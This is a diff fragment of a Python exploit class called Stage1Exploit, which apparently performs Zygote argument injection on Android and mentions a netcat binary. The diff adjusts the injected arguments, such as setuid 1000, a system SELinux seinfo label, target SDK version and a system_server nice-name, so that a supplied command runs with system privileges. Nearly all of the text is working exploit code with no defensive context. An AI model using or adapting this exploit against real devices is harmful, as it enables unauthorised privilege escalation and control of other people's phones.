@@ -179,9 +179,7 @@ class Stage1Exploit:
         else:
             raise ZygoteInjectionException("netcat binary was not found")
 
-           # "--target-sdk-version=28",
-    
-           # "--seinfo=platform:system_server:complete",
+   
 
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
@@ -193,7 +191,9 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=1000",
-            "--setgroups=1002,1005,1007,1016,1023,1024,1065,3003,3009,",
+            "--setgroups=1007,1015,3003",
+            "--target-sdk-version=28",
+            "--seinfo=platform:system_app:complete",
             "--runtime-args",
             "--nice-name=system_server",
             "--runtime-flags=1",
